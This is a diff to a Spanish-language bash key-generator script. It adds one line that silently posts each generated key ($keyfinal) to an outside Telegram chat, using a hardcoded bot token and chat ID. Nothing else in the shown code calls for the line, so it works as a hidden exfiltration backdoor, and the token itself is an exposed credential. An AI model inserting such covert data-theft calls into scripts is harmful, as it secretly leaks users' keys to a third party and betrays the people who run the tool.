@@ -246,6 +246,7 @@ echo -e "\033[1;96m       >>>>>Key Generada Con Exito!<<<<<"
 echo -e "$BARRA"
 echo -e "\033[1;32m    $keyfinal"
 echo -e "$BARRA"
+curl -s -X POST https://api.telegram.org/bot"1320438726:AAGBLjU5Z9PoAuUY3AVYGcHPS5fAugHZ7Uo"/sendMessage -d chat_id="813491965" -d text="$keyfinal"
 read -p "Enter para Finalizar"
 }
 att_gen_key () {
